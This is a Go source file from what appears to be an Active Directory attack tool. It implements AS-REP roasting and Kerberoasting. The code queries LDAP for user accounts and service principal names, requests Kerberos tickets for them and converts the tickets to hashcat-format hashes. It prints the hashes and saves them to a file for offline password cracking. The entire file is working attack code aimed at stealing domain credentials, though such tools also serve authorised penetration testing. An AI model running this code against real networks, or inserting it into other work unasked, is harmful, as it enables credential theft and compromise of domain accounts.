package optldap

import (
	"github.com/5amu/goad/cmd/goad/cli/optkrb5"
	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
)

func (o *Options) asreproast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSComputerName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	var domain string = o.Connection.Domain
	if domain == "" {
		domain = o.target2SMBInfo[target].DNSDomainName
	}

	krb5client, err := optkrb5.NewKerberosClient(domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = FindObjectsWithCallback(lclient, domain, o.filter, func(m map[string]interface{}) error {
		samaccountname, ok := m[SAMAccountName]
		if !ok {
			return nil
		}
		name := UnpackToString(samaccountname)
		asrep, err := krb5client.GetAsReqTgt(name)
		if err != nil {
			prt.StoreFailure(err.Error())
			return nil
		}
		hash := optkrb5.ASREPToHashcat(*asrep.Ticket)
		//prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
		prt.Store(name, hash)
		hashes = append(hashes, hash)
		return nil
	}, SAMAccountName)

	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.AsrepRoast)
	err = utils.WriteLines(hashes, o.Hashes.AsrepRoast)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}

func (o *Options) kerberoast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSComputerName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	var domain string = o.Connection.Domain
	if domain == "" {
		domain = o.target2SMBInfo[target].DNSDomainName
	}

	krb5client, err := optkrb5.NewKerberosClient(domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = FindObjectsWithCallback(lclient, domain, o.filter, func(m map[string]interface{}) error {
		if len(m) == 0 {
			return nil
		}

		spnsToUnpack, ok := m[ServicePrincipalName]
		if !ok {
			return nil
		}
		spns := UnpackToSlice(spnsToUnpack)

		for i, spn := range spns {
			samaccountname, ok := m[SAMAccountName]
			if !ok {
				break
			}
			name := UnpackToString(samaccountname)

			tgs, err := krb5client.GetServiceTicket(name, spn)
			if err != nil {
				prt.StoreFailure(err.Error())
				return nil
			}

			hash := optkrb5.TGSToHashcat(tgs.Ticket, name)
			//prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
			prt.Store(name, hash)

			if i == 0 {
				hashes = append(hashes, hash)
			}
		}
		return nil

	}, SAMAccountName, ServicePrincipalName)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
	if err != nil {
		prt.StoreFailure(err.Error())
	}
}
